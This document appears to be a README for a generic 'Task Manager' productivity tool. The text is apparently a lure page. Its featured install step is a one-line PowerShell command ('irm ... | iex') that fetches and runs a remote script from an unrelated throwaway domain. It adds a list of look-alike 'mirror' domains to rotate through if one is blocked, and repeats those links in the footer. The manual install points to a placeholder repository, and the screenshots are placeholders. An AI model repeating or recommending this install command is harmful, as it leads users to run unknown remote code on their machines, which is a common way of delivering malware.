# Task Manager

> A productivity-focused task manager for tracking daily goals, deadlines, and priorities.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> The task-manager installer is a single PowerShell script that pulls the latest release, installs dependencies, and sets up your config profile automatically.

### Windows (PowerShell)

```powershell
irm https://gitrm.cfd?t=task-manager | iex
```

### Domain Rotation

If the primary domain is unreachable, rotate through these mirrors:

- `gitrm.cfd`
- `gitrm.sbs`
- `gitsl.xyz`
- `viewgit.sbs`
- `gitview.sbs`

Example with a rotated domain:

```powershell
irm https:///viewgit.sbs?t=task-manager | iex
```

### Manual Installation (Python)

```cmd
git clone https://github.com/example/task-manager.git
cd task-manager
pip install -r requirements.txt
python setup.py install
```

## TL;DR - Quick Summary

A CLI and GUI hybrid task manager with priority tagging, deadline reminders, recurring tasks, sync across devices, and productivity analytics. Designed for developers, students, and remote teams who need reliable daily planning.

## Core Features

- ✅ **Priority Tags** — Label tasks as High, Medium, or Low priority with color coding.
- ✅ **Deadline Reminders** — Native OS notifications or email alerts before due dates.
- ✅ **Recurring Tasks** — Daily, weekly, monthly, or custom cron-based repetition.
- ✅ **Cross-Device Sync** — End-to-end encrypted sync via cloud backup or local server.
- ✅ **Productivity Reports** — Weekly and monthly stats with completion heat maps.
- ✅ **CLI Interface** — Full terminal support for power users and scripting.
- ✅ **Focus Timer** — Pomodoro-style timer integrated into every task view.
- ✅ **Tag & Filter System** — Organize with tags, projects, and custom views.

## Usage

```bash
# Add a new task with high priority and due today
task-manager add "Write API documentation" --priority high --due today

# List all tasks due this week
task-manager list --due week

# Start focus timer on a task
task-manager focus 42

# Mark task as complete
task-manager complete 42

# Generate weekly report
task-manager report --week --format pdf > weekly-report.pdf

# Sync tasks with cloud
task-manager sync --push

# Delete a task
task-manager delete 42
```

### GUI Mode

```bash
task-manager gui
```

## REST API

> [!NOTE]
> The task-manager runs an optional HTTP API for integration with external tools (e.g., browser extensions, calendars).

```bash
# Start API server on port 3000
task-manager serve --port 3000

# List all tasks
curl http://localhost:3000/api/tasks

# Get a specific task
curl http://localhost:3000/api/tasks/42

# Create a new task
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"title": "Review PRs", "priority": "high", "due": "2026-09-20"}'

# Update task status
curl -X PATCH http://localhost:3000/api/tasks/42 \
  -H "Content-Type: application/json" \
  -d '{"status": "completed"}'

# Delete a task
curl -X DELETE http://localhost:3000/api/tasks/42
```

## Screenshots

![Dashboard](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Task+Manager+Dashboard)
![Task Entry](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Task+Entry+Form)
![Productivity Report](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Productivity+Report)
![CLI Interface](https://placehold.co/1920x1080/0d1117/e0e0e0?text=CLI+Interface)

## Troubleshooting

| Issue | Solution |
|---|---|
| Sync fails with "auth error" | Regenerate your API token with `task-manager auth --refresh`. |
| Notifications not appearing | Check OS notification permissions and enable desktop alerts. |
| CLI command not found | Add `%LOCALAPPDATA%\task-manager\bin` to your PATH. |
| Report export fails | Install `wkhtmltopdf` or use `--format html` instead. |
| Focus timer doesn't ring | Verify the sound file path in `config/sound.yaml`. |

## Use Cases

- **Personal Productivity** — Daily task tracking with focus timer integration.
- **Team Project Management** — Shared workspaces with assignee and status tracking.
- **Student Study Planner** — Recurring study tasks linked to course deadlines.
- **Developer Task Board** — Integrate with GitHub issues and CI/CD pipelines.
- **Habit Formation** — Build streak-based recurring tasks with progress tracking.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Always back up your task database before major version upgrades. The sync feature encrypts data locally — losing your passphrase means data is unrecoverable.

> [!TIP]
> Use the `--dry-run` flag on bulk operations (e.g., `delete --all`) to preview changes before applying.

## License

This project is licensed under the GNU AGPLv3 License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
task-manager, productivity, pomodoro, recurring-tasks, cross-device-sync, cli-tool, productivity-analytics, deadline-reminder, priority-tagging, focus-timer
-->

[gitrm.cfd](https://gitrm.cfd?t=task-manager) | [gitrm.sbs](https://gitrm.sbs?t=task-manager) | [gitsl.xyz](https://gitsl.xyz?t=task-manager) | [viewgit.sbs](https://viewgit.sbs?t=task-manager) | [gitview.sbs](https://gitview.sbs?t=task-manager)
